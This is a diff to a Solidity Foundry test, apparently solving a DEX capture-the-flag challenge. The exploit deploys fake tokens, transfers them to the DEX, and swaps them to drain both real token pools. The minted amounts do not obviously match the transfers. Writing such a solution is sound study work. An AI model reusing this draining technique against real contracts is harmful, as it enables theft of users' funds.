@@ -46,21 +46,36 @@ contract DexTwoTest is Test {
     function test_Exploit() public {
         //Execute the attacker here.
         vm.startPrank(attacker);
-        SwappableTokenTwo fakeToken = new SwappableTokenTwo(
+        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(
             address(dexTwo),
             "Swap",
             "SW",
-            200 ether
+            1 ether
         );
-        fakeToken.approve(address(dexTwo), 100 ether);
-        fakeToken.transfer(address(dexTwo), 100 ether);
+        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(
+            address(dexTwo),
+            "Swap",
+            "SW",
+            1 ether
+        );
+        fakeToken1.approve(address(dexTwo), 100 ether);
+        fakeToken1.transfer(
+            address(dexTwo),
+            swappabletoken1.balanceOf(address(dexTwo))
+        );
+
+        fakeToken2.approve(address(dexTwo), 100 ether);
+        fakeToken2.transfer(
+            address(dexTwo),
+            swappabletoken2.balanceOf(address(dexTwo))
+        );
         dexTwo.swap(
-            address(fakeToken),
+            address(fakeToken1),
             address(swappabletoken1),
             swappabletoken1.balanceOf(address(dexTwo))
         );
         dexTwo.swap(
-            address(fakeToken),
+            address(fakeToken2),
             address(swappabletoken2),
             swappabletoken2.balanceOf(address(dexTwo))
         );
